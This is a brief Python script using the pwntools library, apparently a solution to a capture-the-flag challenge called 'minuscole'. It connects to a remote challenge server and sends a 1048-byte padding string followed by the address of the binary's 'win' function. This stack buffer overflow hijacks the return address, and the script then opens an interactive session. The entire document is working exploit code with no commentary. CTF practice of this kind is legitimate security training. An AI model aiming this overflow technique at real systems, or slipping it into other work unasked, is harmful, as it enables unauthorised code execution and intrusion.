from pwn import *

r = remote("minuscole.ss2.ccit23.havce.it", 31360); 

exe = ELF("./minuscole")

r.sendlineafter(")", b"a"*1048 + p64(exe.sym.win))

r.interactive()